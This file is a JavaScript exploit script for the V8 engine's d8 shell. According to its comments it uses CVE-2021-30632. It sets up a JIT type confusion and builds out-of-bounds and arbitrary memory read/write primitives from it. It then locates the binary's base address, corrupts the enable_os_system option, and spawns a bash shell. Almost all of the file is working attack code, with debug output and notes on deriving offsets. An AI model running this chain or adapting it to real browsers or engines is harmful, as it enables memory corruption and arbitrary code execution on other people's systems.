function foo(y) {
  x = y;
}

function oobRead() {
  //addrOf b[0] and addrOf writeArr::elements
  return [x[20],x[24]];
}

function oobWrite(addr) {
  x[24] = addr;
}

var arr0 = new Array(10); arr0.fill(1);arr0.a = 1;
var arr1 = new Array(10); arr1.fill(2);arr1.a = 1;
var arr2 = new Array(10); arr2.fill(3); arr2.a = 1;

var x = arr0;

var arr = new Array(30); arr.fill(4); arr.a = 1;
var b = new Array(1); b.fill(1);
var writeArr = [1.1];

for (let i = 0; i < 19321; i++) {
  if (i == 19319) arr2[0] = 1.1;
  foo(arr1);
}

x[0] = 1.1;

for (let i = 0; i < 20000; i++) {
  oobRead();
}

for (let i = 0; i < 20000; i++) oobWrite(1.1);
foo(arr);

var view = new ArrayBuffer(24);
var dblArr = new Float64Array(view);
var intView = new Int32Array(view);
var bigIntView = new BigInt64Array(view);
var addrs = oobRead();

function ftoi32(f) {
	buf = new ArrayBuffer(24);
	view = new DataView(buf);
  view.setFloat64(0, f, true); // little-endian
  return [view.getInt32(0, true), view.getInt32(4, true)];
}

function i32tof(low, high) {
	buf = new ArrayBuffer(24);
	view = new DataView(buf);
  view.setInt32(0, low, true);   // offset 0
  view.setInt32(4, high, true);  // offset 4
  return view.getFloat64(0, true);
}

function itof(i) {
	buf = new ArrayBuffer(24);
	view = new DataView(buf);
  view.setBigInt64(0, i, true); // little-endian
  return view.getFloat64(0, true);
}

function ftoi(f) {
	buf = new ArrayBuffer(24);
	view = new DataView(buf);
  view.setFloat64(0, f, true); // little-endian
  return view.getBigInt64(0, true);
}


dblArr[0] = addrs[0];
dblArr[1] = addrs[1];

function addrOf(obj) {
  b[0] = obj;
  let addrs = oobRead();
  dblArr[0] = addrs[0];
  return intView[1]; 
}

var isBad = false;

// addr: compact address
// return value: 64-bit floating point value
function arbRead(addr) {
  if (isBad) {
    [addr1, elements] = ftoi32(addrs[1]);
    oobWrite(i32tof(addr1,addr));
  } else {
    [elements, addr1] = ftoi32(addrs[1]);
    oobWrite(i32tof(addr,addr1));
  }
  return writeArr[0];
}

// addr: compact address
// val: 64-bit floating point value
function arbWrite(addr, val) {
  if (isBad) {
    [addr1, elements] = ftoi32(addrs[1]);
    oobWrite(i32tof(addr1, addr));
  } else {
    [elements, addr1] = ftoi32(addrs[1]);
    oobWrite(i32tof(addr, addr1));
  }
  writeArr[0] = val;
}

var elementsAddr = ftoi32(addrs[1])[0];
if (elementsAddr == 0x800222d) {
  print("bad address, but it is OK");
  isBad = true;
}

//----------------------------------------------------
// Use CVE-2021-30632 to corrupt options->enable_os_system.
var badVal = [0x1]

var intArr = new Uint8Array(400);
var intArrAddr = addrOf(intArr);
console.log("intArray addr: " + intArrAddr.toString(16));
//var intBackingStore = ftoi(arbRead(intArrAddr + 0x20));
//console.log("intBackingStore: " + ftoi(arbRead(intArrAddr + 0x20)).toString(16));

var intArrMapAddr = ftoi32(arbRead(intArrAddr - 0x08 + 0x00))[0];
console.log("intArrMapAddr: " + intArrMapAddr.toString(16));
var mapConstructorAddr = ftoi32(arbRead(intArrMapAddr - 0x08 + 0x14))[0];
console.log("mapConstructorAddr: " + mapConstructorAddr.toString(16));
var constructorMapAddr = ftoi32(arbRead(mapConstructorAddr - 0x08 + 0x00))[0];
console.log("constructorMapAddr: " + constructorMapAddr.toString(16));
var instanceDescriptors = ftoi32(arbRead(constructorMapAddr - 0x08 + 0x18))[0];
console.log("instanceDescriptors: " + instanceDescriptors.toString(16));
var propertyLength = ftoi32(arbRead(instanceDescriptors - 0x08 + 0x18))[0];
console.log("propertyLength: " + propertyLength.toString(16));
var lengthSetter = ftoi32(arbRead(propertyLength - 0x08 + 0x10))[0];
console.log("lengthSetter: " + lengthSetter.toString(16));
var foreignAddress = ftoi(arbRead(lengthSetter - 0x08 + 0x04));
console.log("foreignAddress: " + foreignAddress.toString(16));
foreignAddress = Number(foreignAddress);

// offsets of `foreign_address` with the binary
// obtained this way:
//    1. disable ASLR
//    2. run d8 within gdb
//    3. vmmap to find the binary load address
//    4. use foreignAddress - load base address
var loadBaseAddr = foreignAddress - 0x8eff10;
console.log("binary load address: " + loadBaseAddr.toString(16));

// offset of "v8::Shell::options" or "_ZN2v85Shell7optionsE"
// obtained by "nm d8 | grep _ZN2v85Shell7optionsE"
var optionAddr = loadBaseAddr + 0x16ee438;
console.log("optionAddr: " + optionAddr.toString(16));

// offset of enableOsSystem within v8::Shell::options
// obtained this way:
//    1. compile one version with debug info
//    2. load it with gdb
//    3. print &((v8::ShellOptions*)0)->enable_os_system
var enableOsSystem = optionAddr + 0x238 + 0x8;    // why +0x8, not sure
console.log("enableOsSystem: " + enableOsSystem.toString(16));

rwxAddr = itof(BigInt(enableOsSystem));
console.log("rwxAddr: ", ftoi(rwxAddr).toString(16));

if (isBad) {
  [addr1, elements] = ftoi32(addrs[1]);
  oobWrite(i32tof(addr1, intArrAddr + 0x20));
} else {
  [elements, addr1] = ftoi32(addrs[1]);
  oobWrite(i32tof(intArrAddr + 0x20, addr1));
}
writeArr[0] = rwxAddr;
for (let i = 0; i < badVal.length; i++) {
  intArr[i] = badVal[i];
}

console.log('[+] Exploited! Run bash without --enable-os-system');

var workerScript = `os.system("bash", ["-norc"])`;
var worker = new Worker(workerScript, {type: 'string'});
